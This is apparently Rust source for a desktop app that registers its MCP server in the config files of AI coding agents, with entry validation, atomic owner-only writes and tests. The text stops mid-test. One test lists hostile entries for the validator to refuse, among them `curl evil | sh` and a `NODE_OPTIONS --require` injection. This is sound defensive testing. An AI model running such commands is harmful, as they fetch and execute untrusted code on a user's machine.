//! Registers the app's MCP server with the agents on this computer, by editing
//! each agent's own config file, which is what its `mcp add` command does from
//! a terminal.
//!
//! This side is the authority on everything that could run code. An agent id
//! resolves to one file, its format and the key servers live under; the entry
//! is always named `to-hoot`; the stdio server is downloaded here, from this
//! version's release, never handed over by the webview, into a folder the
//! webview cannot write to; and an entry is
//! accepted only if it is an https endpoint URL or exactly node, that server
//! and the app's settings file. So a webview that went wrong can point an
//! agent at an endpoint at worst, and never at a program of its choosing. The
//! webview still decides how each agent spells an entry, because it also shows
//! the same entry as a snippet for anyone who would rather paste it.
//!
//! The app writes one entry and leaves everything else in the file as it found
//! it, key order included, and keeps any field a person added to the entry by
//! hand. These files also hold the person's other servers, their preferences
//! and their project history, none of which is the app's business. A file that
//! does not parse is refused rather than overwritten: a config the agent cannot
//! read is worse than a server it lacks.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};
use tauri::{AppHandle, Manager, Runtime};

/// The name of the entry in every agent's config.
pub const NAME: &str = "to-hoot";

/// The agents the app knows how to configure. The ids are the ones the
/// webview sends.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Deserialize)]
pub enum Agent {
    #[serde(rename = "claude-code")]
    ClaudeCode,
    #[serde(rename = "codex")]
    Codex,
    #[serde(rename = "gemini-cli")]
    GeminiCli,
    #[serde(rename = "cursor")]
    Cursor,
    #[serde(rename = "vscode")]
    VsCode,
    #[serde(rename = "windsurf")]
    Windsurf,
    #[serde(rename = "opencode")]
    Opencode,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Format {
    Json,
    /// Codex alone, whose config is `config.toml`.
    Toml,
}

/// The directories every location is built from, passed in so the table can be
/// tested without touching the real home directory.
pub struct Dirs {
    pub home: PathBuf,
    /// The platform's per-user config directory: `~/.config` on Linux,
    /// `~/Library/Application Support` on macOS, `%APPDATA%` on Windows.
    pub config: PathBuf,
    /// `$CODEX_HOME`, which Codex reads instead of `~/.codex` when it is set.
    pub codex_home: Option<PathBuf>,
    /// `$XDG_CONFIG_HOME`, which opencode reads on every platform.
    pub xdg_config: Option<PathBuf>,
}

pub struct Location {
    pub file: PathBuf,
    pub format: Format,
    /// The key the agent keeps its servers under. `packages/ui/src/agents.ts`
    /// spells the same keys for its snippets; a test on each side holds them.
    pub key: &'static str,
    /// A folder whose presence says the agent is installed here.
    pub marker: PathBuf,
}

impl Agent {
    pub fn location(self, dirs: &Dirs) -> Location {
        let home = &dirs.home;
        let json = |file: PathBuf, key: &'static str, marker: PathBuf| Location { file, format: Format::Json, key, marker };
        match self {
            Agent::ClaudeCode => json(home.join(".claude.json"), "mcpServers", home.join(".claude")),
            Agent::Codex => {
                let dir = dirs.codex_home.clone().unwrap_or_else(|| home.join(".codex"));
                Location { file: dir.join("config.toml"), format: Format::Toml, key: "mcp_servers", marker: dir }
            }
            Agent::GeminiCli => json(home.join(".gemini").join("settings.json"), "mcpServers", home.join(".gemini")),
            Agent::Cursor => json(home.join(".cursor").join("mcp.json"), "mcpServers", home.join(".cursor")),
            Agent::VsCode => {
                let user = dirs.config.join("Code").join("User");
                json(user.join("mcp.json"), "servers", dirs.config.join("Code"))
            }
            Agent::Windsurf => {
                let dir = home.join(".codeium").join("windsurf");
                json(dir.join("mcp_config.json"), "mcpServers", dir)
            }
            Agent::Opencode => {
                let dir = dirs.xdg_config.clone().unwrap_or_else(|| home.join(".config")).join("opencode");
                json(dir.join("opencode.json"), "mcp", dir)
            }
        }
    }
}

fn dirs<R: Runtime>(app: &AppHandle<R>) -> Result<Dirs, String> {
    let path = app.path();
    let home = path.home_dir().map_err(|err| format!("no home directory: {err}"))?;
    let config = path.config_dir().map_err(|err| format!("no config directory: {err}"))?;
    let set = |key: &str| std::env::var_os(key).filter(|v| !v.is_empty()).map(PathBuf::from);
    Ok(Dirs { home, config, codex_home: set("CODEX_HOME"), xdg_config: set("XDG_CONFIG_HOME") })
}

/// The URL of a remote entry or the program of a local one, whatever the
/// agent calls the field.
fn target_of(server: &Value) -> Option<String> {
    for key in URL_FIELDS {
        if let Some(url) = server.get(key).and_then(Value::as_str) {
            return Some(url.to_string());
        }
    }
    match server.get("command")? {
        Value::String(command) => Some(command.clone()),
        // opencode spells a local command as one array.
        Value::Array(parts) => parts.first().and_then(Value::as_str).map(str::to_string),
        _ => None,
    }
}

/// What the different agents call an endpoint's URL.
const URL_FIELDS: [&str; 3] = ["url", "httpUrl", "serverUrl"];

/// Every field the app writes into an entry. Re-adding replaces these and
/// keeps the rest, so a timeout or a tool allowlist a person added by hand
/// survives, and a local entry turned remote does not keep its command.
const MANAGED: [&str; 9] = ["type", "url", "httpUrl", "serverUrl", "command", "args", "env", "environment", "enabled"];

/// What a local entry is allowed to run: this machine's node (or plain `node`
/// when none was found), the server this module installed, and the app's own
/// settings file as its one variable.
pub struct Allowed {
    pub node: Option<String>,
    pub server: String,
    pub settings: String,
}

fn str_array(value: &Value) -> Option<Vec<&str>> {
    value.as_array()?.iter().map(Value::as_str).collect()
}

/// Refuses any entry that is not an https endpoint or exactly the app's own
/// local server. This is the line between "the window asked for a server" and
/// "the window chose a program for an agent to run".
pub fn check_entry(entry: &Value, allowed: &Allowed) -> Result<(), String> {
    let Value::Object(fields) = entry else {
        return Err("an entry has to be an object".to_string());
    };
    let node_ok = |s: &str| s == "node" || allowed.node.as_deref() == Some(s);
    let mut remote = false;
    let mut local = false;
    for (key, value) in fields {
        match key.as_str() {
            "type" => match value.as_str() {
                Some("http" | "remote") => remote = true,
                Some("stdio" | "local") => local = true,
                _ => return Err(format!("unexpected type {value}")),
            },
            "enabled" if value.is_boolean() => {}
            k if URL_FIELDS.contains(&k) => {
                let url = value.as_str().unwrap_or_default();
                if !url.starts_with("https://") || !url.contains("/mcp/") {
                    return Err("an endpoint has to be an https URL ending in /mcp/<secret>".to_string());
                }
                remote = true;
            }
            "command" => {
                let ok = match value {
                    Value::String(command) => node_ok(command),
                    // opencode: the command and its arguments in one array.
                    _ => matches!(str_array(value).as_deref(), Some([node, server]) if node_ok(node) && *server == allowed.server),
                };
                if !ok {
                    return Err("a local entry can only run node with the installed server".to_string());
                }
                local = true;
            }
            "args" => {
                if str_array(value).as_deref() != Some(&[allowed.server.as_str()][..]) {
                    return Err("a local entry can only run the installed server".to_string());
                }
            }
            "env" | "environment" => {
                let only_settings = value
                    .as_object()
                    .is_some_and(|env| env.len() == 1 && env.get("TO_HOOT_SETTINGS").and_then(Value::as_str) == Some(&allowed.settings));
                if !only_settings {
                    return Err("a local entry carries the settings file and nothing else".to_string());
                }
            }
            other => return Err(format!("unexpected field `{other}` in an entry")),
        }
    }
    match (remote, local) {
        (true, false) if target_of(entry).is_some() => Ok(()),
        (false, true) if fields.contains_key("command") => Ok(()),
        _ => Err("an entry is either an endpoint or the local server".to_string()),
    }
}

/// The file with the entry set, for a JSON config. An absent or empty file is
/// an empty object. An entry already there keeps the fields the app does not
/// manage.
pub fn json_with_server(existing: &str, key: &str, name: &str, server: Value) -> Result<String, String> {
    let mut root: Value = if existing.trim().is_empty() {
        Value::Object(Map::new())
    } else {
        serde_json::from_str(existing).map_err(|err| format!("the config is not valid JSON, so it was left alone: {err}"))?
    };
    let Value::Object(map) = &mut root else {
        return Err("the config is not a JSON object, so it was left alone".to_string());
    };
    let servers = map.entry(key).or_insert_with(|| Value::Object(Map::new()));
    let Value::Object(servers) = servers else {
        return Err(format!("`{key}` in the config is not an object, so it was left alone"));
    };
    let Value::Object(fresh) = server else {
        return Err("a server entry has to be an object".to_string());
    };
    let mut entry = match servers.remove(name) {
        Some(Value::Object(old)) => old.into_iter().filter(|(k, _)| !MANAGED.contains(&k.as_str())).collect(),
        _ => Map::new(),
    };
    entry.extend(fresh);
    servers.insert(name.to_string(), Value::Object(entry));
    let mut text = serde_json::to_string_pretty(&root).map_err(|err| err.to_string())?;
    text.push('\n');
    Ok(text)
}

pub fn json_entry(existing: &str, key: &str, name: &str) -> Option<Value> {
    let root: Value = serde_json::from_str(existing).ok()?;
    root.get(key)?.get(name).cloned()
}

/// One JSON value as TOML. Codex entries are strings, string arrays and one
/// nested table of environment variables; anything else is refused rather than
/// guessed at.
fn toml_item(value: &Value) -> Result<toml_edit::Item, String> {
    use toml_edit::{value as v, Array, Item, Table};
    Ok(match value {
        Value::String(s) => v(s.as_str()),
        Value::Bool(b) => v(*b),
        Value::Number(n) => match n.as_i64() {
            Some(i) => v(i),
            None => v(n.as_f64().ok_or("a number TOML cannot hold")?),
        },
        Value::Array(items) => {
            let mut array = Array::new();
            for item in items {
                let Value::String(s) = item else {
                    return Err("only arrays of strings can be written to config.toml".to_string());
                };
                array.push(s.as_str());
            }
            v(array)
        }
        Value::Object(map) => {
            let mut table = Table::new();
            for (k, inner) in map {
                table.insert(k, toml_item(inner)?);
            }
            Item::Table(table)
        }
        Value::Null => return Err("null has no TOML spelling".to_string()),
    })
}

/// The file with the entry set, for Codex's `config.toml`. `toml_edit` keeps
/// the rest of the document as it was written, comments and order included,
/// and an entry already there keeps the fields the app does not manage.
pub fn toml_with_server(existing: &str, key: &str, name: &str, server: &Value) -> Result<String, String> {
    let mut doc: toml_edit::DocumentMut = existing
        .parse()
        .map_err(|err| format!("the config is not valid TOML, so it was left alone: {err}"))?;
    let servers = doc.entry(key).or_insert(toml_edit::table());
    let Some(servers) = servers.as_table_mut() else {
        return Err(format!("`{key}` in the config is not a table, so it was left alone"));
    };
    // `[mcp_servers.to-hoot]` alone, rather than an empty `[mcp_servers]`
    // header above it.
    servers.set_implicit(true);
    let toml_edit::Item::Table(fresh) = toml_item(server)? else {
        return Err("a server entry has to be a table".to_string());
    };
    match servers.get_mut(name).and_then(toml_edit::Item::as_table_mut) {
        Some(entry) => {
            for managed in MANAGED {
                entry.remove(managed);
            }
            for (k, item) in fresh.iter() {
                entry.insert(k, item.clone());
            }
        }
        None => {
            servers.insert(name, toml_edit::Item::Table(fresh));
        }
    }
    Ok(doc.to_string())
}

pub fn toml_entry(existing: &str, key: &str, name: &str) -> Option<Value> {
    let doc: toml_edit::DocumentMut = existing.parse().ok()?;
    let table = doc.get(key)?.get(name)?.as_table_like()?;
    let mut out = Map::new();
    for (k, item) in table.iter() {
        if let Some(s) = item.as_str() {
            out.insert(k.to_string(), Value::String(s.to_string()));
        }
    }
    Some(Value::Object(out))
}

/// Replaces `path` with `contents` by writing beside it and renaming over it,
/// so a crash mid-write leaves the old file whole rather than a truncated one.
///
/// What goes in is a credential either way (an endpoint URL is one), so the
/// file ends up readable by its owner alone: the temporary file is created
/// that way before anything is written to it, an existing file keeps its
/// owner's bits and loses group and other, and each write has a temporary name
/// of its own so two at once cannot trip over each other.
fn replace_file(path: &Path, contents: &str) -> Result<(), String> {
    static NEXT: AtomicU64 = AtomicU64::new(0);
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).map_err(|err| format!("could not create {}: {err}", parent.display()))?;
    }
    let mut temp_name = path.file_name().map(|n| n.to_os_string()).unwrap_or_default();
    temp_name.push(format!(".to-hoot-{}-{}.tmp", std::process::id(), NEXT.fetch_add(1, Ordering::Relaxed)));
    let temp = path.with_file_name(temp_name);
    let written = create_private(&temp).and_then(|mut file| file.write_all(contents.as_bytes()));
    if let Err(err) = written {
        let _ = fs::remove_file(&temp);
        return Err(format!("could not write {}: {err}", temp.display()));
    }
    owner_only(&temp, fs::metadata(path).ok().as_ref());
    fs::rename(&temp, path).map_err(|err| {
        let _ = fs::remove_file(&temp);
        format!("could not replace {}: {err}", path.display())
    })
}

#[cfg(unix)]
fn create_private(path: &Path) -> std::io::Result<fs::File> {
    use std::os::unix::fs::OpenOptionsExt;
    fs::OpenOptions::new().write(true).create_new(true).mode(0o600).open(path)
}

/// Windows keeps a file in the profile private to its user already.
#[cfg(not(unix))]
fn create_private(path: &Path) -> std::io::Result<fs::File> {
    fs::OpenOptions::new().write(true).create_new(true).open(path)
}

/// Owner-only: the old file's owner bits (0600 when there was none), with
/// group and other removed.
#[cfg(unix)]
fn owner_only(path: &Path, old: Option<&fs::Metadata>) {
    use std::os::unix::fs::PermissionsExt;
    let owner = old.map(|m| m.permissions().mode() & 0o700).unwrap_or(0o600);
    let _ = fs::set_permissions(path, fs::Permissions::from_mode(owner));
}

#[cfg(not(unix))]
fn owner_only(_path: &Path, _old: Option<&fs::Metadata>) {}

fn read_existing(path: &Path) -> Result<String, String> {
    match fs::read_to_string(path) {
        Ok(text) => Ok(text),
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => Ok(String::new()),
        Err(err) => Err(format!("could not read {}: {err}", path.display())),
    }
}

/// What the agents screen shows for one agent.
#[derive(Serialize)]
pub struct Entry {
    /// The config file, for the screen to name.
    pub path: String,
    /// Whether the agent looks installed here.
    pub installed: bool,
    /// Whether the file already has the app's entry.
    pub present: bool,
    pub target: Option<String>,
}

#[tauri::command]
pub fn agent_inspect<R: Runtime>(app: AppHandle<R>, agent: Agent) -> Result<Entry, String> {
    let location = agent.location(&dirs(&app)?);
    let existing = fs::read_to_string(&location.file).unwrap_or_default();
    let entry = match location.format {
        Format::Json => json_entry(&existing, location.key, NAME),
        Format::Toml => toml_entry(&existing, location.key, NAME),
    };
    Ok(Entry {
        path: location.file.display().to_string(),
        installed: location.marker.exists() || location.file.exists(),
        present: entry.is_some(),
        target: entry.as_ref().and_then(target_of),
    })
}

/// Adds or updates the app's entry and answers with the file it wrote.
#[tauri::command]
pub fn agent_add<R: Runtime>(app: AppHandle<R>, agent: Agent, entry: Value) -> Result<String, String> {
    let dirs = dirs(&app)?;
    let allowed = Allowed {
        node: find_node(std::env::var_os("PATH"), &dirs.home).map(|p| p.display().to_string()),
        server: server_dir(&app)?.join(SERVER_FILE).display().to_string(),
        settings: data_dir(&app)?.join(SETTINGS_FILE).display().to_string(),
    };
    check_entry(&entry, &allowed)?;
    let location = agent.location(&dirs);
    let existing = read_existing(&location.file)?;
    let next = match location.format {
        Format::Json => json_with_server(&existing, location.key, NAME, entry)?,
        Format::Toml => toml_with_server(&existing, location.key, NAME, &entry)?,
    };
    replace_file(&location.file, &next)?;
    Ok(location.file.display().to_string())
}

/// Where the local server was put, the node that can run it, and the settings
/// file it reads the data repository from.
#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LocalServer {
    pub path: String,
    pub node: Option<String>,
    pub node_version: Option<String>,
    /// The app's own store, which holds the repository and the token. The
    /// agent's entry names this file rather than carrying the token itself.
    pub settings: String,
}

const SERVER_DIR: &str = "mcp";
pub const SERVER_FILE: &str = "to-hoot-mcp.mjs";
/// Beside the server: the version it was downloaded for.
const SERVER_VERSION_FILE: &str = "to-hoot-mcp.version";
/// The store file `apps/desktop/src/platform.ts` opens, in the data folder.
pub const SETTINGS_FILE: &str = "to-hoot.json";

/// The bundled stdio server the release workflow publishes for this version.
fn server_url() -> String {
    format!(
        "https://github.com/danieltyukov/to-hoot/releases/download/v{}/{SERVER_FILE}",
        env!("CARGO_PKG_VERSION")
    )
}

fn data_dir<R: Runtime>(app: &AppHandle<R>) -> Result<PathBuf, String> {
    app.path().app_data_dir().map_err(|err| format!("no data directory: {err}"))
}

/// Where the server lives: the app's cache folder, not its data folder.
///
/// The window may write anywhere under the data folder (the event log lives
/// there, through the fs plugin's `appdata` write scope), so a server kept
/// there could be rewritten by the window after the entry that runs it was
/// checked, which would undo the whole point of checking it. The cache folder
/// is read-only to the window on every system: `~/.cache/<id>` on Linux,
/// `~/Library/Caches/<id>` on macOS, and the local rather than the roaming
/// AppData on Windows. A cache may be cleared; pressing Add downloads it again.
fn server_dir<R: Runtime>(app: &AppHandle<R>) -> Result<PathBuf, String> {
    Ok(app.path().app_cache_dir().map_err(|err| format!("no cache directory: {err}"))?.join(SERVER_DIR))
}

/// The bundle starts with node's shebang and names itself in its startup line;
/// an error page or a release listing does neither.
pub fn looks_like_server(text: &str) -> bool {
    text.starts_with("#!/usr/bin/env node") && text.contains("to-hoot mcp")
}

/// Puts this version's stdio server in the app's cache folder, downloading it
/// only when the copy there is for another version, and finds a node to run it
/// with, every time, so installing Node.js and pressing Add again works.
#[tauri::command]
pub async fn agent_server_install<R: Runtime>(app: AppHandle<R>) -> Result<LocalServer, String> {
    let data = data_dir(&app)?;
    let dir = server_dir(&app)?;
    let path = dir.join(SERVER_FILE);
    let marker = dir.join(SERVER_VERSION_FILE);
    let version = env!("CARGO_PKG_VERSION");
    let current = path.is_file() && fs::read_to_string(&marker).is_ok_and(|v| v.trim() == version);
    if !current {
        let res = tauri_plugin_http::reqwest::get(server_url())
            .await
            .map_err(|err| format!("could not download the local server: {err}"))?;
        if res.status() == 404 {
            return Err(format!("no local server is published for version {version} yet"));
        }
        if !res.status().is_success() {
            return Err(format!("the release answered {} for the local server", res.status()));
        }
        let text = res.text().await.map_err(|err| format!("could not download the local server: {err}"))?;
        if !looks_like_server(&text) {
            return Err("what the release sent back is not the to-hoot server".to_string());
        }
        replace_file(&path, &text)?;
        replace_file(&marker, version)?;
    }
    // The store holds the token, and an agent's server is now reading it, so
    // it is narrowed to its owner as well. The store plugin rewrites the file
    // in place, which keeps the mode.
    let settings = data.join(SETTINGS_FILE);
    if let Ok(meta) = fs::metadata(&settings) {
        owner_only(&settings, Some(&meta));
    }
    let home = dirs(&app)?.home;
    let node = find_node(std::env::var_os("PATH"), &home);
    let node_version = node.as_deref().and_then(node_version);
    Ok(LocalServer {
        path: path.display().to_string(),
        node: node.map(|p| p.display().to_string()),
        node_version,
        settings: settings.display().to_string(),
    })
}

#[cfg(windows)]
const NODE: &str = "node.exe";
#[cfg(not(windows))]
const NODE: &str = "node";

/// Folders node is commonly installed in that a desktop session's `PATH` may
/// not include: an editor launched from the Dock or a launcher inherits the
/// session's environment, not a shell's, so `node` from Homebrew or a version
/// manager is often missing from it.
fn usual_places(home: &Path) -> Vec<PathBuf> {
    let mut places = Vec::new();
    #[cfg(not(windows))]
    {
        for dir in ["/opt/homebrew/bin", "/usr/local/bin", "/usr/bin"] {
            places.push(PathBuf::from(dir));
        }
        places.push(home.join(".volta/bin"));
        places.push(home.join(".local/bin"));
        places.push(home.join(".local/share/fnm/aliases/default/bin"));
        places.push(home.join(".nix-profile/bin"));
    }
    #[cfg(windows)]
    {
        if let Some(files) = std::env::var_os("ProgramFiles") {
            places.push(PathBuf::from(files).join("nodejs"));
        }
        if let Some(local) = std::env::var_os("LOCALAPPDATA") {
            places.push(PathBuf::from(local).join("Volta").join("bin"));
        }
    }
    // nvm last: its node lives under a versioned folder, so a path into it
    // stops working when that version is uninstalled.
    if let Some(newest) = newest_nvm(&home.join(".nvm/versions/node")) {
        places.push(newest.join("bin"));
    }
    places
}

/// The highest `vX.Y.Z` folder under nvm's versions directory.
fn newest_nvm(dir: &Path) -> Option<PathBuf> {
    let parse = |name: &str| -> Option<(u64, u64, u64)> {
        let mut parts = name.strip_prefix('v')?.splitn(3, '.').map(|p| p.parse::<u64>().ok());
        Some((parts.next()??, parts.next()??, parts.next()??))
    };
    fs::read_dir(dir)
        .ok()?
        .filter_map(Result::ok)
        .filter_map(|e| parse(&e.file_name().to_string_lossy()).map(|v| (v, e.path())))
        .max_by_key(|(v, _)| *v)
        .map(|(_, p)| p)
}

/// The first `node` on `PATH`, then in the usual places.
pub fn find_node(path_var: Option<std::ffi::OsString>, home: &Path) -> Option<PathBuf> {
    let from_path: Vec<PathBuf> = path_var.map(|p| std::env::split_paths(&p).collect()).unwrap_or_default();
    from_path
        .into_iter()
        .chain(usual_places(home))
        .map(|dir| dir.join(NODE))
        .find(|candidate| candidate.is_file())
}

/// `node --version`, without the leading `v`.
fn node_version(node: &Path) -> Option<String> {
    let out = std::process::Command::new(node).arg("--version").output().ok()?;
    if !out.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&out.stdout).trim().to_string();
    Some(text.strip_prefix('v').unwrap_or(&text).to_string())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn test_dirs() -> Dirs {
        Dirs {
            home: PathBuf::from("/home/u"),
            config: PathBuf::from("/home/u/.config"),
            codex_home: None,
            xdg_config: None,
        }
    }

    fn allowed() -> Allowed {
        Allowed {
            node: Some("/usr/bin/node".to_string()),
            server: "/data/mcp/to-hoot-mcp.mjs".to_string(),
            settings: "/data/to-hoot.json".to_string(),
        }
    }

    const URL: &str = "https://to-hoot-mcp.someone.workers.dev/mcp/abc";

    #[test]
    fn every_agent_has_a_file_and_a_key() {
        let d = test_dirs();
        let at = |a: Agent| {
            let l = a.location(&d);
            (l.file, l.key)
        };
        assert_eq!(at(Agent::ClaudeCode), (PathBuf::from("/home/u/.claude.json"), "mcpServers"));
        assert_eq!(at(Agent::Codex), (PathBuf::from("/home/u/.codex/config.toml"), "mcp_servers"));
        assert_eq!(Agent::Codex.location(&d).format, Format::Toml);
        assert_eq!(at(Agent::GeminiCli), (PathBuf::from("/home/u/.gemini/settings.json"), "mcpServers"));
        assert_eq!(at(Agent::Cursor), (PathBuf::from("/home/u/.cursor/mcp.json"), "mcpServers"));
        assert_eq!(at(Agent::VsCode), (PathBuf::from("/home/u/.config/Code/User/mcp.json"), "servers"));
        assert_eq!(at(Agent::Windsurf), (PathBuf::from("/home/u/.codeium/windsurf/mcp_config.json"), "mcpServers"));
        assert_eq!(at(Agent::Opencode), (PathBuf::from("/home/u/.config/opencode/opencode.json"), "mcp"));
    }

    #[test]
    fn codex_and_opencode_follow_their_environment() {
        let d = Dirs { codex_home: Some(PathBuf::from("/c")), xdg_config: Some(PathBuf::from("/x")), ..test_dirs() };
        assert_eq!(Agent::Codex.location(&d).file, PathBuf::from("/c/config.toml"));
        assert_eq!(Agent::Opencode.location(&d).file, PathBuf::from("/x/opencode/opencode.json"));
    }

    #[test]
    fn the_ids_are_the_ones_the_webview_sends() {
        for (id, agent) in [
            ("claude-code", Agent::ClaudeCode),
            ("codex", Agent::Codex),
            ("gemini-cli", Agent::GeminiCli),
            ("cursor", Agent::Cursor),
            ("vscode", Agent::VsCode),
            ("windsurf", Agent::Windsurf),
            ("opencode", Agent::Opencode),
        ] {
            assert_eq!(serde_json::from_value::<Agent>(json!(id)).unwrap(), agent);
        }
        assert!(serde_json::from_value::<Agent>(json!("../../etc")).is_err());
    }

    #[test]
    fn accepts_every_shape_the_app_writes() {
        let a = allowed();
        for entry in [
            json!({"type": "http", "url": URL}),
            json!({"url": URL}),
            json!({"httpUrl": URL}),
            json!({"serverUrl": URL}),
            json!({"type": "remote", "url": URL, "enabled": true}),
            json!({"type": "stdio", "command": "/usr/bin/node", "args": ["/data/mcp/to-hoot-mcp.mjs"], "env": {"TO_HOOT_SETTINGS": "/data/to-hoot.json"}}),
            json!({"command": "node", "args": ["/data/mcp/to-hoot-mcp.mjs"], "env": {"TO_HOOT_SETTINGS": "/data/to-hoot.json"}}),
            json!({"type": "local", "command": ["/usr/bin/node", "/data/mcp/to-hoot-mcp.mjs"], "environment": {"TO_HOOT_SETTINGS": "/data/to-hoot.json"}, "enabled": true}),
        ] {
            assert_eq!(check_entry(&entry, &a), Ok(()), "{entry}");
        }
    }

    #[test]
    fn refuses_anything_that_would_run_something_else() {
        let a = allowed();
        for entry in [
            json!({"command": "sh", "args": ["-c", "curl evil | sh"]}),
            json!({"command": "/usr/bin/node", "args": ["/tmp/evil.mjs"], "env": {"TO_HOOT_SETTINGS": "/data/to-hoot.json"}}),
            json!({"command": "/usr/bin/node", "args": ["/data/mcp/to-hoot-mcp.mjs", "--inspect"]}),
            json!({"command": "/usr/bin/node", "args": ["/data/mcp/to-hoot-mcp.mjs"], "env": {"NODE_OPTIONS": "--require /tmp/x"}}),
            json!({"command": "/usr/bin/node", "args": ["/data/mcp/to-hoot-mcp.mjs"], "env": {"TO_HOOT_SETTINGS": "/data/to-hoot.json", "X": "1"}}),
            json!({"type": "local", "command": ["bash", "/data/mcp/to-hoot-mcp.mjs"]}),
            json!({"url": "http://plain.example/mcp/x"}),
            json!({"url": "https://example.com/elsewhere"}),
            json!({"url": URL, "command": "node"}),
            json!({"url": URL, "headers": {"x": "y"}}),
            json!({"type": "sse", "url": URL}),
            json!({}),
            json!("https://x/mcp/y"),
        ] {
            assert!(check_entry(&entry, &a).is_err(), "{entry}");
        }
    }

    #[test]
    fn json_adds_the_server_and_keeps_everything_else_in_order() {
        let before = r#"{"numStartups": 3, "mcpServers": {"other": {"type": "stdio", "command": "x"}}, "autoUpdates": false, "projects": {}}"#;
        let after = json_with_server(before, "mcpServers", "to-hoot", json!({"type": "http", "url": URL})).unwrap();
        let parsed: Value = serde_json::from_str(&after).unwrap();
        assert_eq!(parsed["numStartups"], 3);
        assert_eq!(parsed["mcpServers"]["other"]["command"], "x");
        assert_eq!(parsed["mcpServers"]["to-hoot"]["url"], URL);
        // Not re-sorted: the keys come back in the order the file had them.
        let keys: Vec<&String> = parsed.as_object().unwrap().keys().collect();
        assert_eq!(keys, ["numStartups", "mcpServers", "autoUpdates", "projects"]);
    }

    #[test]
    fn json_replaces_the_managed_fields_and_keeps_the_ones_added_by_hand() {
        let local = json!({"type": "stdio", "command": "node", "args": ["/s.mjs"], "env": {"TO_HOOT_SETTINGS": "/x"}});
        let first = json_with_server("", "servers", "to-hoot", local).unwrap();
        let mut parsed: Value = serde_json::from_str(&first).unwrap();
        parsed["servers"]["to-hoot"]["timeout"] = json!(30000);
        let edited = serde_json::to_string(&parsed).unwrap();

        let second = json_with_server(&edited, "servers", "to-hoot", json!({"type": "http", "url": "https://y/mcp/z"})).unwrap();
        let entry = json_entry(&second, "servers", "to-hoot").unwrap();
        assert_eq!(entry, json!({"timeout": 30000, "type": "http", "url": "https://y/mcp/z"}));
        assert_eq!(target_of(&entry).as_deref(), Some("https://y/mcp/z"));
        assert!(json_entry(&second, "servers", "other").is_none());
    }

    #[test]
    fn json_refuses_to_overwrite_a_file_it_cannot_read() {
        assert!(json_with_server("not json", "mcpServers", "to-hoot", json!({})).is_err());
        assert!(json_with_server("[1,2]", "mcpServers", "to-hoot", json!({})).is_err());
        assert!(json_with_server(r#"{"mcpServers": 5}"#, "mcpServers", "to-hoot", json!({})).is_err());
        // VS Code allows comments in mcp.json; a file with them is left alone.
        assert!(json_with_server("{ // mine\n}", "servers", "to-hoot", json!({})).is_err());
    }

    #[test]
    fn toml_adds_a_table_and_keeps_comments_and_other_servers() {
        let before = "# my settings\nmodel = \"o4\"\n\n[mcp_servers.other]\ncommand = \"x\"\n";
        let after = toml_with_server(
            before,
            "mcp_servers",
            "to-hoot",
            &json!({"command": "/usr/bin/node", "args": ["/data/to-hoot-mcp.mjs"], "env": {"TO_HOOT_SETTINGS": "/data/to-hoot.json"}}),
        )
        .unwrap();
        assert!(after.starts_with("# my settings\nmodel = \"o4\"\n"));
        assert!(after.contains("[mcp_servers.other]\ncommand = \"x\""));
        assert!(after.contains("[mcp_servers.to-hoot]"));
        assert!(after.contains("[mcp_servers.to-hoot.env]\nTO_HOOT_SETTINGS = \"/data/to-hoot.json\""));
        assert!(!after.contains("\n[mcp_servers]\n"));
        let entry = toml_entry(&after, "mcp_servers", "to-hoot").unwrap();
        assert_eq!(target_of(&entry).as_deref(), Some("/usr/bin/node"));
    }

    #[test]
    fn toml_replaces_the_managed_fields_and_keeps_the_ones_added_by_hand() {
        let first = toml_with_server("", "mcp_servers", "to-hoot", &json!({"command": "node", "args": ["/s.mjs"]})).unwrap();
        assert!(!first.contains("\n[mcp_servers]\n") && !first.starts_with("[mcp_servers]\n"));
        let edited = first.replace("args = [\"/s.mjs\"]", "args = [\"/s.mjs\"]\nstartup_timeout_sec = 20");
        let second = toml_with_server(&edited, "mcp_servers", "to-hoot", &json!({"url": "https://z/mcp/q"})).unwrap();
        assert!(!second.contains("command"));
        assert!(!second.contains("args"));
        assert!(second.contains("startup_timeout_sec = 20"));
        let entry = toml_entry(&second, "mcp_servers", "to-hoot").unwrap();
        assert_eq!(target_of(&entry).as_deref(), Some("https://z/mcp/q"));
        // The written text parses back as TOML.
        second.parse::<toml_edit::DocumentMut>().unwrap();
    }

    #[test]
    fn toml_refuses_what_it_cannot_read_or_write() {
        assert!(toml_with_server("not = = toml", "mcp_servers", "to-hoot", &json!({})).is_err());
        assert!(toml_with_server("mcp_servers = 5", "mcp_servers", "to-hoot", &json!({})).is_err());
        assert!(toml_with_server("", "mcp_servers", "to-hoot", &json!({"args": [1]})).is_err());
    }

    #[test]
    fn the_target_is_whatever_the_agent_calls_it() {
        assert_eq!(target_of(&json!({"httpUrl": "https://g"})).as_deref(), Some("https://g"));
        assert_eq!(target_of(&json!({"serverUrl": "https://w"})).as_deref(), Some("https://w"));
        assert_eq!(target_of(&json!({"type": "local", "command": ["node", "x"]})).as_deref(), Some("node"));
        assert_eq!(target_of(&json!({"type": "remote"})), None);
    }

    #[test]
    fn recognises_the_server_bundle() {
        assert!(looks_like_server("#!/usr/bin/env node\nconsole.error('to-hoot mcp: serving')"));
        assert!(!looks_like_server("<!doctype html><title>Not Found</title>"));
        assert!(server_url().ends_with(&format!("/v{}/to-hoot-mcp.mjs", env!("CARGO_PKG_VERSION"))));
    }

    #[test]
    fn replace_file_creates_folders_and_leaves_only_the_owner_able_to_read() {
        let dir = std::env::temp_dir().join(format!("to-hoot-agents-{}", std::process::id()));
        let path = dir.join("nested").join("mcp.json");
        replace_file(&path, "{}").unwrap();
        assert_eq!(fs::read_to_string(&path).unwrap(), "{}");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o600);
            // A config another program created world-readable keeps its
            // owner's bits and loses everyone else's.
            fs::set_permissions(&path, fs::Permissions::from_mode(0o744)).unwrap();
